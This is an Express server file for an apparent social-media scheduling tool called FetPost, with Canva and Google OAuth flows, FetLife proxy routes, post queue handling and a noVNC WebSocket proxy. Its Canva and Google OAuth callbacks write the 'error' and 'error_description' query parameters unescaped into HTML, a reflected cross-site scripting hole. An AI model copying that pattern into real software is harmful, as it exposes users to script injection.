// Step 1: kick off OAuth — browser visits this and gets redirected to Canva.
// Not behind requireAuth because it has to work as a top-level browser navigation;
// we rely on the OAuth state parameter for CSRF protection.
app.get('/oauth/canva/authorize', (req, res) => {
  if (!canvaConfigured()) return res.status(400).send('Canva not configured. Set CANVA_CLIENT_ID, CANVA_CLIENT_SECRET, CANVA_REDIRECT_URI in .env.');
  try {
    res.redirect(canva.buildAuthUrl(process.env.CANVA_REDIRECT_URI));
  } catch (err) { res.status(500).send('OAuth start failed: ' + err.message); }
});

// Step 2: Canva sends the user back here with a code.
app.get('/oauth/canva/callback', async (req, res) => {
  const { code, state, error, error_description } = req.query;
  if (error) return res.status(400).send(`<h2>Canva authorization failed</h2><pre>${error}: ${error_description || ''}</pre>`);
  if (!code || !state) return res.status(400).send('Missing code or state.');
  try {
    await canva.exchangeCodeForTokens(code, state, process.env.CANVA_REDIRECT_URI);
    res.send(`<!doctype html><html><body style="font-family:system-ui;padding:40px;text-align:center;background:#1a1a1a;color:#eee">
      <h2 style="color:#5fa">✓ Canva connected</h2>
      <p>You can close this tab and return to FetPost.</p>
      <script>setTimeout(() => window.close(), 1500);</script>
    </body></html>`);
  } catch (err) {
    res.status(500).send(`<h2>Token exchange failed</h2><pre>${err.message}</pre>`);
  }
});

app.post('/api/canva/disconnect', requireAdmin, async (req, res) => {
  try { await canva.clearTokens(); res.json({ success: true }); }
  catch (err) { res.status(500).json({ error: err.message }); }
});

app.get('/api/canva/designs', requireEditor, async (req, res) => {
  try {
    const result = await canva.listDesigns({ continuation: req.query.continuation });
    res.json(result);
  } catch (err) { res.status(500).json({ error: err.message }); }
});

// ── Engagement metrics proxy ────────────────────────────────────────────────

app.get('/api/fetlife/cookies/freshness', requireAuth, async (req, res) => {
  try {
    const result = await proxyRequest('fetlife', 'GET', '/cookies/freshness');
    res.status(result.status).json(result.data);
  } catch (err) { res.status(500).json({ error: err.message }); }
});

app.get('/api/fetlife/cookies/refresh-status', requireAuth, async (req, res) => {
  try {
    const result = await proxyRequest('fetlife', 'GET', '/cookies/refresh-status');
    res.status(result.status).json(result.data);
  } catch (err) { res.status(500).json({ error: err.message }); }
});

app.post('/api/fetlife/metrics/post/refresh', requireEditor, async (req, res) => {
  try {
    const result = await proxyRequest('fetlife', 'POST', '/metrics/post/refresh', req.body);
    res.status(result.status).json(result.data);
  } catch (err) { res.status(500).json({ error: err.message }); }
});

app.get('/api/fetlife/metrics/post/:postId', requireAuth, async (req, res) => {
  try {
    const result = await proxyRequest('fetlife', 'GET', '/metrics/post/' + encodeURIComponent(req.params.postId));
    res.status(result.status).json(result.data);
  } catch (err) { res.status(500).json({ error: err.message }); }
});

app.post('/api/fetlife/metrics/event/refresh', requireEditor, async (req, res) => {
  try {
    const result = await proxyRequest('fetlife', 'POST', '/metrics/event/refresh', req.body);
    res.status(result.status).json(result.data);
  } catch (err) { res.status(500).json({ error: err.message }); }
});

app.get('/api/fetlife/metrics/event/:eventId', requireAuth, async (req, res) => {
  try {
    const result = await proxyRequest('fetlife', 'GET', '/metrics/event/' + encodeURIComponent(req.params.eventId));
    res.status(result.status).json(result.data);
  } catch (err) { res.status(500).json({ error: err.message }); }
});

app.get('/api/canva/folder-items', requireEditor, async (req, res) => {
  const folderId = req.query.folderId || 'root';
  try {
    const result = await canva.listFolderItems(folderId, {
      continuation: req.query.continuation,
      itemTypes: req.query.itemTypes,
    });
    res.json(result);
  } catch (err) { res.status(500).json({ error: err.message }); }
});

// Pick a design → export → download → return as image attachment
app.post('/api/canva/import-design', requireEditor, async (req, res) => {
  const { designId, name, format } = req.body || {};
  if (!designId) return res.status(400).json({ error: 'designId required' });
  try {
    const urls = await canva.exportAndWait(designId, format || 'png');
    if (!urls.length) return res.status(500).json({ error: 'Export returned no URLs' });
    const attachment = await canva.fetchExportAsAttachment(urls[0], (name || 'canva-design') + (format === 'jpg' ? '.jpg' : '.png'));
    res.json({ success: true, image: attachment });
  } catch (err) { res.status(500).json({ error: err.message }); }
});

// ── Google Sheets integration (OAuth + push mentions) ───────────────────────

function googleConfigured() {
  return !!(process.env.GOOGLE_OAUTH_CLIENT_ID && process.env.GOOGLE_OAUTH_CLIENT_SECRET && process.env.GOOGLE_OAUTH_REDIRECT_URI);
}

app.get('/api/google/status', requireAdmin, async (req, res) => {
  try {
    const configured = googleConfigured();
    const connected = configured ? await google.isConnected() : false;
    const email = connected ? await google.connectedEmail() : null;
    res.json({ configured, connected, email });
  } catch (err) { res.status(500).json({ error: err.message }); }
});

app.get('/oauth/google/authorize', (req, res) => {
  if (!googleConfigured()) return res.status(400).send('Google not configured. Set GOOGLE_OAUTH_CLIENT_ID, GOOGLE_OAUTH_CLIENT_SECRET, GOOGLE_OAUTH_REDIRECT_URI in .env.');
  try {
    res.redirect(google.buildAuthUrl(process.env.GOOGLE_OAUTH_REDIRECT_URI));
  } catch (err) { res.status(500).send('OAuth start failed: ' + err.message); }
});

app.get('/oauth/google/callback', async (req, res) => {
  const { code, state, error, error_description } = req.query;
  if (error) return res.status(400).send(`<h2>Google authorization failed</h2><pre>${error}: ${error_description || ''}</pre>`);
  if (!code || !state) return res.status(400).send('Missing code or state.');
  try {
    const tokens = await google.exchangeCodeForTokens(code, state, process.env.GOOGLE_OAUTH_REDIRECT_URI);
    res.send(`<!doctype html><html><body style="font-family:system-ui;padding:40px;text-align:center;background:#1a1a1a;color:#eee">
      <h2 style="color:#5fa">✓ Google connected</h2>
      <p>Signed in as <strong>${tokens.email || 'unknown'}</strong>. You can close this tab and return to FetPost.</p>
      <script>setTimeout(() => window.close(), 1800);</script>
    </body></html>`);
  } catch (err) {
    res.status(500).send(`<h2>Token exchange failed</h2><pre>${err.message}</pre>`);
  }
});

app.post('/api/google/disconnect', requireAdmin, async (req, res) => {
  try { await google.clearTokens(); res.json({ success: true }); }
  catch (err) { res.status(500).json({ error: err.message }); }
});

// Create a new spreadsheet in the connected Google account.
// body: { title, firstTabName? }
app.post('/api/google/create-sheet', requireEditor, async (req, res) => {
  if (!await google.isConnected()) return res.status(400).json({ error: 'Google not connected' });
  const { title, firstTabName } = req.body || {};
  if (!title || !String(title).trim()) return res.status(400).json({ error: 'title required' });
  try {
    const sheet = await google.createSpreadsheet(String(title).trim(), firstTabName || 'Mentions');
    res.json({ success: true, ...sheet });
  } catch (err) {
    console.error('[google/create-sheet]', err);
    res.status(500).json({ error: err.message });
  }
});

// Push the currently-stored, non-ignored mentions for an account to a Google Sheet.
// body: { spreadsheetIdOrUrl, tabName?, includeIgnored?, includeSaved? }
// Default tabName: account name. Default columns: Date, Author, Post URL, Snippet.
app.post('/api/mentions/:accountId/export-sheet', requireEditor, requireAccountAccess, async (req, res) => {
  const { spreadsheetIdOrUrl, tabName, includeSaved } = req.body || {};
  if (!await google.isConnected()) return res.status(400).json({ error: 'Google not connected. Connect in the Mentions tab first.' });
  const spreadsheetId = google.parseSheetId(spreadsheetIdOrUrl);
  if (!spreadsheetId) return res.status(400).json({ error: 'Could not parse spreadsheet ID from input. Paste either the full URL or the ID.' });

  try {
    const accountId = req.params.accountId;
    const tab = (tabName && tabName.trim()) || accountId;

    // Fetch current visible mentions (hideIgnored=true by default, self-posts excluded by backend)
    const listResp = await proxyRequest('fetlife', 'GET', '/mentions/' + encodeURIComponent(accountId));
    const mentions = (listResp.data?.mentions || []).filter(m => includeSaved !== false || !m.saved);

    if (!mentions.length) return res.json({ success: true, exported: 0, deduped: 0, note: 'No mentions to export.' });

    // Dedupe against URLs already in the sheet's column C
    const existing = await google.readExistingValuesInColumn(spreadsheetId, tab, 'C');
    const fresh = mentions.filter(m => !existing.has(m.postUrl));

    // Ensure header row exists if the tab is new (appendRows will create the tab; we'll
    // detect "no header" by checking if column A row 1 is empty, but simpler: always
    // try to write header — if duplicate, the user can dedupe themselves once).
    const headerRow = ['Date and Time (UTC)', 'Author', 'Post URL', 'Snippet'];
    const dataRows = fresh.map(m => [
      m.timeISO ? new Date(m.timeISO).toISOString().replace('T', ' ').slice(0, 16) : '',
      m.author || '',
      m.postUrl,
      (m.snippet || '').replace(/\s+/g, ' ').slice(0, 500),
    ]);

    // Write header only if this is a fresh tab (we detect by checking existing values were empty)
    const rowsToWrite = (existing.size === 0) ? [headerRow, ...dataRows] : dataRows;

    if (!rowsToWrite.length) return res.json({ success: true, exported: 0, deduped: mentions.length, note: 'All mentions already in sheet.' });

    const result = await google.appendRows(spreadsheetId, tab, rowsToWrite);
    res.json({
      success: true,
      exported: fresh.length,
      deduped: mentions.length - fresh.length,
      tab,
      updatedRange: result.updates?.updatedRange,
    });
  } catch (err) {
    console.error('[mentions/export-sheet]', err);
    res.status(500).json({ error: err.message });
  }
});

// ── Progress jobs (poll long-running scrapes) ───────────────────────────────
app.get('/api/fetlife/jobs/:jobId', requireAuth, async (req, res) => {
  try {
    const result = await proxyRequest('fetlife', 'GET', '/jobs/' + encodeURIComponent(req.params.jobId));
    res.status(result.status).json(result.data);
  } catch (err) { res.status(500).json({ error: err.message }); }
});

// ── FetLife groups + organized events (cross-post discovery) ─────────────────

app.get('/api/fetlife/:accountId/groups', requireAuth, requireAccountAccess, async (req, res) => {
  try {
    const result = await proxyRequest('fetlife', 'GET', '/accounts/' + encodeURIComponent(req.params.accountId) + '/groups');
    res.status(result.status).json(result.data);
  } catch (err) { res.status(500).json({ error: err.message }); }
});

app.get('/api/fetlife/:accountId/group-rules', requireAuth, requireAccountAccess, async (req, res) => {
  try {
    const result = await proxyRequest('fetlife', 'GET', '/accounts/' + encodeURIComponent(req.params.accountId) + '/group-rules');
    res.status(result.status).json(result.data);
  } catch (err) { res.status(500).json({ error: err.message }); }
});

app.post('/api/fetlife/:accountId/group-rules/refresh', requireEditor, requireAccountAccess, async (req, res) => {
  try {
    const result = await proxyRequest('fetlife', 'POST', withProgressFlag('/accounts/' + encodeURIComponent(req.params.accountId) + '/group-rules/refresh', req));
    res.status(result.status).json(result.data);
  } catch (err) { res.status(500).json({ error: err.message }); }
});

app.post('/api/fetlife/:accountId/groups/refresh', requireEditor, requireAccountAccess, async (req, res) => {
  try {
    const result = await proxyRequest('fetlife', 'POST', withProgressFlag('/accounts/' + encodeURIComponent(req.params.accountId) + '/groups/refresh', req));
    res.status(result.status).json(result.data);
  } catch (err) { res.status(500).json({ error: err.message }); }
});

app.get('/api/fetlife/:accountId/events', requireAuth, requireScope('events:read'), requireAccountAccess, async (req, res) => {
  try {
    const result = await proxyRequest('fetlife', 'GET', '/accounts/' + encodeURIComponent(req.params.accountId) + '/events');
    res.status(result.status).json(result.data);
  } catch (err) { res.status(500).json({ error: err.message }); }
});

// Attending (RSVP'd) events — used by Venue accounts in the event picker as "Promoter Event"s.
app.get('/api/fetlife/:accountId/events/attending', requireAuth, requireScope('events:read'), requireAccountAccess, async (req, res) => {
  try {
    const result = await proxyRequest('fetlife', 'GET', '/accounts/' + encodeURIComponent(req.params.accountId) + '/events/attending');
    res.status(result.status).json(result.data);
  } catch (err) { res.status(500).json({ error: err.message }); }
});

app.post('/api/fetlife/:accountId/events/attending/refresh', requireEditor, requireAccountAccess, async (req, res) => {
  try {
    const result = await proxyRequest('fetlife', 'POST', withProgressFlag('/accounts/' + encodeURIComponent(req.params.accountId) + '/events/attending/refresh', req));
    res.status(result.status).json(result.data);
  } catch (err) { res.status(500).json({ error: err.message }); }
});

app.get('/api/fetlife/:accountId/events/website', requireAuth, requireScope('events:read'), requireAccountAccess, async (req, res) => {
  try {
    const result = await proxyRequest('fetlife', 'GET', '/accounts/' + encodeURIComponent(req.params.accountId) + '/events/website');
    res.status(result.status).json(result.data);
  } catch (err) { res.status(500).json({ error: err.message }); }
});

app.post('/api/fetlife/:accountId/events/website/test', requireEditor, requireAccountAccess, async (req, res) => {
  try {
    const result = await proxyRequest('fetlife', 'POST', '/accounts/' + encodeURIComponent(req.params.accountId) + '/events/website/test', req.body);
    res.status(result.status).json(result.data);
  } catch (err) { res.status(500).json({ error: err.message }); }
});

app.post('/api/fetlife/:accountId/events/refresh', requireEditor, requireAccountAccess, async (req, res) => {
  try {
    const result = await proxyRequest('fetlife', 'POST', withProgressFlag('/accounts/' + encodeURIComponent(req.params.accountId) + '/events/refresh', req));
    res.status(result.status).json(result.data);
  } catch (err) { res.status(500).json({ error: err.message }); }
});

// Tracked events
app.get('/api/fetlife/:accountId/events/tracked', requireAuth, requireScope('events:read'), requireAccountAccess, async (req, res) => {
  try {
    const result = await proxyRequest('fetlife', 'GET', '/accounts/' + encodeURIComponent(req.params.accountId) + '/events/tracked');
    res.status(result.status).json(result.data);
  } catch (err) { res.status(500).json({ error: err.message }); }
});

app.post('/api/fetlife/:accountId/events/tracked', requireEditor, requireAccountAccess, async (req, res) => {
  try {
    const result = await proxyRequest('fetlife', 'POST', '/accounts/' + encodeURIComponent(req.params.accountId) + '/events/tracked', req.body);
    res.status(result.status).json(result.data);
  } catch (err) { res.status(500).json({ error: err.message }); }
});

app.delete('/api/fetlife/:accountId/events/tracked', requireEditor, requireAccountAccess, async (req, res) => {
  try {
    const result = await proxyRequest('fetlife', 'DELETE', '/accounts/' + encodeURIComponent(req.params.accountId) + '/events/tracked', req.body);
    res.status(result.status).json(result.data);
  } catch (err) { res.status(500).json({ error: err.message }); }
});

app.post('/api/fetlife/:accountId/events/tracked/refresh-all', requireEditor, requireAccountAccess, async (req, res) => {
  try {
    const result = await proxyRequest('fetlife', 'POST', withProgressFlag('/accounts/' + encodeURIComponent(req.params.accountId) + '/events/tracked/refresh-all', req));
    res.status(result.status).json(result.data);
  } catch (err) { res.status(500).json({ error: err.message }); }
});

// ── Tracked posts (engagement) proxies ─────────────────────────────────────

app.get('/api/fetlife/:accountId/posts/tracked', requireAuth, requireAccountAccess, async (req, res) => {
  try {
    const result = await proxyRequest('fetlife', 'GET', '/accounts/' + encodeURIComponent(req.params.accountId) + '/posts/tracked');
    res.status(result.status).json(result.data);
  } catch (err) { res.status(500).json({ error: err.message }); }
});

app.post('/api/fetlife/:accountId/posts/tracked', requireEditor, requireAccountAccess, async (req, res) => {
  try {
    const result = await proxyRequest('fetlife', 'POST', '/accounts/' + encodeURIComponent(req.params.accountId) + '/posts/tracked', req.body);
    res.status(result.status).json(result.data);
  } catch (err) { res.status(500).json({ error: err.message }); }
});

app.delete('/api/fetlife/:accountId/posts/tracked', requireEditor, requireAccountAccess, async (req, res) => {
  try {
    const result = await proxyRequest('fetlife', 'DELETE', '/accounts/' + encodeURIComponent(req.params.accountId) + '/posts/tracked', req.body);
    res.status(result.status).json(result.data);
  } catch (err) { res.status(500).json({ error: err.message }); }
});

app.post('/api/fetlife/:accountId/posts/tracked/refresh-all', requireEditor, requireAccountAccess, async (req, res) => {
  try {
    const result = await proxyRequest('fetlife', 'POST', withProgressFlag('/accounts/' + encodeURIComponent(req.params.accountId) + '/posts/tracked/refresh-all', req));
    res.status(result.status).json(result.data);
  } catch (err) { res.status(500).json({ error: err.message }); }
});

// ── Templates proxies ──────────────────────────────────────────────────────

app.get('/api/fetlife/:accountId/templates', requireAuth, requireAccountAccess, async (req, res) => {
  try {
    const result = await proxyRequest('fetlife', 'GET', '/accounts/' + encodeURIComponent(req.params.accountId) + '/templates');
    res.status(result.status).json(result.data);
  } catch (err) { res.status(500).json({ error: err.message }); }
});

app.post('/api/fetlife/:accountId/templates', requireEditor, requireAccountAccess, async (req, res) => {
  try {
    const result = await proxyRequest('fetlife', 'POST', '/accounts/' + encodeURIComponent(req.params.accountId) + '/templates', req.body);
    res.status(result.status).json(result.data);
  } catch (err) { res.status(500).json({ error: err.message }); }
});

app.delete('/api/fetlife/:accountId/templates/:id', requireEditor, requireAccountAccess, async (req, res) => {
  try {
    const result = await proxyRequest('fetlife', 'DELETE', '/accounts/' + encodeURIComponent(req.params.accountId) + '/templates/' + encodeURIComponent(req.params.id));
    res.status(result.status).json(result.data);
  } catch (err) { res.status(500).json({ error: err.message }); }
});

app.put('/api/fetlife/:accountId/templates/:id', requireEditor, requireAccountAccess, async (req, res) => {
  try {
    const result = await proxyRequest('fetlife', 'PUT', '/accounts/' + encodeURIComponent(req.params.accountId) + '/templates/' + encodeURIComponent(req.params.id), req.body);
    res.status(result.status).json(result.data);
  } catch (err) { res.status(500).json({ error: err.message }); }
});

app.get('/api/fetlife/:accountId/events/insights', requireAuth, requireScope('events:read'), requireAccountAccess, async (req, res) => {
  try {
    const result = await proxyRequest('fetlife', 'GET', '/accounts/' + encodeURIComponent(req.params.accountId) + '/events/insights');
    res.status(result.status).json(result.data);
  } catch (err) { res.status(500).json({ error: err.message }); }
});

app.get('/api/fetlife/:accountId/events/past', requireAuth, requireScope('events:read'), requireAccountAccess, async (req, res) => {
  try {
    const result = await proxyRequest('fetlife', 'GET', '/accounts/' + encodeURIComponent(req.params.accountId) + '/events/past');
    res.status(result.status).json(result.data);
  } catch (err) { res.status(500).json({ error: err.message }); }
});

app.post('/api/fetlife/:accountId/events/past/refresh', requireEditor, requireAccountAccess, async (req, res) => {
  try {
    const result = await proxyRequest('fetlife', 'POST', withProgressFlag('/accounts/' + encodeURIComponent(req.params.accountId) + '/events/past/refresh', req));
    res.status(result.status).json(result.data);
  } catch (err) { res.status(500).json({ error: err.message }); }
});

app.get('/api/fetlife/:accountId/events/details', requireAuth, requireScope('events:read'), requireAccountAccess, async (req, res) => {
  const { url, eventIds, refresh } = req.query;
  // Batched form preferred. Returns { events:[...], notFound:[...] } and supports
  // ETag/If-None-Match so QM's phase-aware poll only pays for changed snapshots.
  if (eventIds) {
    try {
      const qs = 'eventIds=' + encodeURIComponent(eventIds) + (refresh ? '&refresh=' + encodeURIComponent(refresh) : '');
      const result = await proxyRequest('fetlife', 'GET',
        '/accounts/' + encodeURIComponent(req.params.accountId) + '/events/details?' + qs);
      if (result.status >= 400) return res.status(result.status).json(result.data);
      // Strong ETag over the canonical JSON body. crypto already imported at top.
      const body = JSON.stringify(result.data);
      const etag = '"' + crypto.createHash('sha256').update(body).digest('base64url').slice(0, 27) + '"';
      const ifNoneMatch = req.headers['if-none-match'];
      if (ifNoneMatch && ifNoneMatch === etag) {
        res.setHeader('ETag', etag);
        return res.status(304).end();
      }
      res.setHeader('ETag', etag);
      res.setHeader('Content-Type', 'application/json');
      return res.status(200).send(body);
    } catch (err) { return res.status(500).json({ error: err.message }); }
  }
  if (!url) return res.status(400).json({ error: 'url or eventIds query param required' });
  try {
    const result = await proxyRequest('fetlife', 'GET',
      '/accounts/' + encodeURIComponent(req.params.accountId) + '/events/details?url=' + encodeURIComponent(url));
    res.status(result.status).json(result.data);
  } catch (err) { res.status(500).json({ error: err.message }); }
});

// ── Posts ─────────────────────────────────────────────────────────────────────

app.get('/api/queue', requireAuth, async (req, res) => {
  try {
    const results = await Promise.allSettled(
      Object.keys(SERVICES).map(p => proxyRequest(p, 'GET', '/posts'))
    );
    const platforms = Object.keys(SERVICES);
    const posts = [];
    results.forEach((r, i) => {
      const platform = platforms[i];
      const list = r.status === 'fulfilled' ? (r.value.data.posts || []) : [];
      list.forEach(p => posts.push(Object.assign({}, p, { platform })));
    });
    posts.sort((a, b) => new Date(a.scheduledAt) - new Date(b.scheduledAt));
    const scoped = auth.filterAccountList(req.user, posts, 'accountId');
    res.set('Cache-Control', 'no-store');
    res.json({ posts: scoped });
  } catch (err) { res.status(500).json({ error: err.message }); }
});

app.post('/api/posts', requireEditor, async (req, res) => {
  const { platforms, accountIds, content, scheduledAt, images, media, postType, eventDetails, eventUrl,
    pendingFetlifeMatch, sourceEventTitle, sourceEventDate, sourceEventUrl } = req.body;
  if (!platforms || !accountIds || !scheduledAt) return res.status(400).json({ error: 'platforms, accountIds, scheduledAt required' });

  // Validate every accountId in the body is one the user is allowed to post to.
  // accountIds are in "platform:accountId" form; extract accountId for the scope check.
  for (const fullId of accountIds) {
    const acc = fullId.substring(fullId.indexOf(':') + 1);
    if (!auth.canAccessAccount(req.user, acc)) {
      return res.status(403).json({ error: 'Access denied to account ' + acc });
    }
  }

  const results = [];

  for (const platform of platforms) {
    const platformAccounts = accountIds.filter(id => id.substring(0, id.indexOf(':')) === platform);

    for (const fullId of platformAccounts) {
      const accountId = fullId.substring(fullId.indexOf(':') + 1);
      const postId = platform + '-' + accountId + '-' + Date.now() + '-' + Math.random().toString(36).slice(2);

      try {
        let body = { postId, accountId, content: content || '', scheduledAt };

        if (platform === 'fetlife') {
          body.postType = postType || 'status';
          if (eventDetails) body.eventDetails = eventDetails;
          if (eventUrl) body.eventUrl = eventUrl;
          if (images && images.length) body.images = images;
          if (pendingFetlifeMatch) {
            body.pendingFetlifeMatch = true;
            body.sourceEventTitle = sourceEventTitle || null;
            body.sourceEventDate = sourceEventDate || null;
            body.sourceEventUrl = sourceEventUrl || null;
          }
        } else if (platform === 'bluesky') {
          if (images && images.length) body.images = images;
        } else {
          // OnlyFans, Fansly, ManyVids, NiteFlirt — use media array
          const allMedia = media || images || [];
          if (allMedia.length) body.media = allMedia;
        }

        const result = await proxyRequest(platform, 'POST', '/posts', body);
        results.push(Object.assign({ platform, accountId, success: result.ok, postId }, result.data));
      } catch (err) {
        results.push({ platform, accountId, success: false, error: err.message });
      }
    }
  }

  res.json({ results });
});

app.delete('/api/posts/:platform/:postId', requireEditor, async (req, res) => {
  const { platform, postId } = req.params;
  if (!(await assertPostAccess(req, res, platform, postId))) return;
  try {
    const result = await proxyRequest(platform, 'DELETE', '/posts/' + encodeURIComponent(postId));
    res.status(result.status).json(result.data);
  } catch (err) { res.status(500).json({ error: err.message }); }
});

app.get('/api/posts/:platform/:postId/fetlife-candidates', requireAuth, async (req, res) => {
  const { platform, postId } = req.params;
  if (!(await assertPostAccess(req, res, platform, postId))) return;
  try {
    const result = await proxyRequest(platform, 'GET', '/posts/' + encodeURIComponent(postId) + '/fetlife-candidates');
    res.status(result.status).json(result.data);
  } catch (err) { res.status(500).json({ error: err.message }); }
});

app.post('/api/posts/:platform/:postId/link-fetlife', requireEditor, async (req, res) => {
  const { platform, postId } = req.params;
  if (!(await assertPostAccess(req, res, platform, postId))) return;
  try {
    const result = await proxyRequest(platform, 'POST', '/posts/' + encodeURIComponent(postId) + '/link-fetlife', req.body);
    res.status(result.status).json(result.data);
  } catch (err) { res.status(500).json({ error: err.message }); }
});

app.put('/api/posts/:platform/:postId', requireEditor, async (req, res) => {
  const { platform, postId } = req.params;
  if (!(await assertPostAccess(req, res, platform, postId))) return;
  try {
    const result = await proxyRequest(platform, 'PUT', '/posts/' + encodeURIComponent(postId), req.body);
    res.status(result.status).json(result.data);
  } catch (err) { res.status(500).json({ error: err.message }); }
});

app.post('/api/posts/:platform/:postId/retry', requireEditor, async (req, res) => {
  const { platform, postId } = req.params;
  if (!(await assertPostAccess(req, res, platform, postId))) return;
  try {
    const result = await proxyRequest(platform, 'POST', '/posts/' + encodeURIComponent(postId) + '/retry');
    res.status(result.status).json(result.data);
  } catch (err) { res.status(500).json({ error: err.message }); }
});

// Confirm a moderation-pending or outcome-unknown post is actually live on FetLife
// (operator-verified). Flips its status to `sent` without re-firing the post.
app.post('/api/posts/:platform/:postId/confirm-sent', requireEditor, async (req, res) => {
  const { platform, postId } = req.params;
  if (!(await assertPostAccess(req, res, platform, postId))) return;
  try {
    const result = await proxyRequest(platform, 'POST', '/posts/' + encodeURIComponent(postId) + '/confirm-sent');
    res.status(result.status).json(result.data);
  } catch (err) { res.status(500).json({ error: err.message }); }
});

// Operator-rejected: post went through moderation but was denied (or silently
// never appeared). Distinct from the technical `failed` status — used to track
// content-rejection rate per account.
app.post('/api/posts/:platform/:postId/mark-rejected', requireEditor, async (req, res) => {
  const { platform, postId } = req.params;
  if (!(await assertPostAccess(req, res, platform, postId))) return;
  try {
    const result = await proxyRequest(platform, 'POST', '/posts/' + encodeURIComponent(postId) + '/mark-rejected', req.body);
    res.status(result.status).json(result.data);
  } catch (err) { res.status(500).json({ error: err.message }); }
});

app.post('/api/posts/:platform/clear-by-status', requireAdmin, async (req, res) => {
  const { platform } = req.params;
  try {
    const result = await proxyRequest(platform, 'POST', '/posts/clear-by-status', req.body);
    res.status(result.status).json(result.data);
  } catch (err) { res.status(500).json({ error: err.message }); }
});

// FetLife-only: fan one event out to N groups under a single account.
app.post('/api/fetlife/group-event', requireEditor, async (req, res) => {
  const { accountId, eventUrl, title, body, groupIds, scheduledAt, groupsPerDay, weekdaysOnly } = req.body;
  if (!accountId || !eventUrl || !title || !body || !scheduledAt) {
    return res.status(400).json({ error: 'accountId, eventUrl, title, body, scheduledAt required' });
  }
  if (!auth.canAccessAccount(req.user, accountId)) {
    return res.status(403).json({ error: 'Access denied to account ' + accountId });
  }
  if (!Array.isArray(groupIds) || groupIds.length === 0) {
    return res.status(400).json({ error: 'groupIds (non-empty array) required' });
  }
  const postId = 'fetlife-' + accountId + '-' + Date.now() + '-' + Math.random().toString(36).slice(2);
  try {
    const result = await proxyRequest('fetlife', 'POST', '/posts', {
      postId, accountId, postType: 'group_event',
      eventUrl, title, body, groupIds, scheduledAt, groupsPerDay, weekdaysOnly,
    });
    res.status(result.status).json(result.data);
  } catch (err) { res.status(500).json({ error: err.message }); }
});

// ── History ───────────────────────────────────────────────────────────────────

app.get('/api/history', requireAuth, async (req, res) => {
  try {
    const results = await Promise.allSettled(
      Object.keys(SERVICES).map(p => proxyRequest(p, 'GET', '/history?limit=50'))
    );
    const platforms = Object.keys(SERVICES);
    const history = [];
    results.forEach((r, i) => {
      const platform = platforms[i];
      const list = r.status === 'fulfilled' ? (r.value.data.history || []) : [];
      list.forEach(h => history.push(Object.assign({}, h, { platform })));
    });
    history.sort((a, b) => new Date(b.ts) - new Date(a.ts));
    const scoped = auth.filterAccountList(req.user, history, 'accountId');
    res.json({ history: scoped });
  } catch (err) { res.status(500).json({ error: err.message }); }
});

// ── Health ────────────────────────────────────────────────────────────────────

app.get('/api/health/:service', requireAuth, async (req, res) => {
  const service = SERVICES[req.params.service];
  if (!service) return res.status(404).json({ error: 'Unknown service' });
  try {
    const r = await fetch(service.url + '/health');
    res.json(await r.json());
  } catch { res.status(503).json({ error: 'Service unreachable' }); }
});

app.get('/api/services', requireAuth, async (req, res) => {
  const statuses = {};
  await Promise.all(Object.entries(SERVICES).map(async ([name, svc]) => {
    try {
      const r = await fetch(svc.url + '/health');
      statuses[name] = r.ok ? 'online' : 'error';
    } catch { statuses[name] = 'offline'; }
  }));
  res.json({ statuses });
});

// ── Frontend ──────────────────────────────────────────────────────────────────

// Serve the bundled noVNC client at /novnc/ — the cookies-capture page loads it from there.
// @novnc/novnc is a pure-static distribution; we just point Express at its lib/ + core/ dirs.
const NOVNC_ROOT = path.resolve(__dirname, '..', 'node_modules', '@novnc', 'novnc');
if (fs.existsSync(NOVNC_ROOT)) {
  app.use('/novnc', express.static(NOVNC_ROOT));
}

app.use(express.static(path.join(__dirname, '..', 'public')));
app.get('*', (req, res) => res.sendFile(path.join(__dirname, '..', 'public', 'index.html')));

// HTTP server (instead of bare app.listen) so we can hook the WebSocket upgrade event for
// the noVNC proxy. websockify on the droplet listens on 6080; we proxy /api/vnc-ws there
// so the customer's browser only needs to talk to the single nexuspost-ui port (4000) and
// never directly to VNC. The proxy is gated: it only accepts upgrades while the wizard is
// still active, or when the request carries a valid session token.
const VNC_WS_TARGET = process.env.VNC_WS_TARGET || 'ws://127.0.0.1:6080';
const vncWsProxy = httpProxy.createProxyServer({ target: VNC_WS_TARGET, ws: true, changeOrigin: true });
vncWsProxy.on('error', err => { console.error('[fetpost-ui] vnc-ws proxy error:', err.message); });

const server = http.createServer(app);

server.on('upgrade', async (req, socket, head) => {
  if (!req.url || !req.url.startsWith('/api/vnc-ws')) {
    socket.destroy();
    return;
  }
  // Allow upgrade if either:
  // - the wizard is still in progress (pre-auth setup phase), OR
  // - the caller passed a valid session token in the query string (?token=…)
  const url = new URL(req.url, 'http://127.0.0.1');
  const token = url.searchParams.get('token');
  const wizardActive = !readWizard().completed;
  let user = null;
  if (token) {
    try { user = await auth.getUserBySession(token); } catch {}
  }
  if (!wizardActive && !(user && user.active)) {
    socket.destroy();
    return;
  }
  vncWsProxy.ws(req, socket, head);
});

server.listen(PORT, '0.0.0.0', async () => {
  console.log('[fetpost-ui] Running on http://127.0.0.1:' + PORT);
  if (!process.env.FL_SERVICE_SECRET) {
    console.warn('[fetpost-ui] WARNING: FL_SERVICE_SECRET not set — UI cannot reach the FetLife service. Did you run setup.cmd?');
  }
  try {
    const bootstrapped = await auth.bootstrapAdmin();
    if (bootstrapped) {
      console.log('[fetpost-ui] Bootstrapped admin user "' + bootstrapped.username + '" from ADMIN_USERNAME/ADMIN_INITIAL_PASSWORD env. Must change password on first login.');
    }
    if (!(await auth.hasAnyUsers())) {
      console.warn('[fetpost-ui] WARNING: no users yet — first-run wizard will create the admin on visit.');
    }
  } catch (err) {
    console.error('[fetpost-ui] Auth bootstrap failed:', err.message);
  }
});
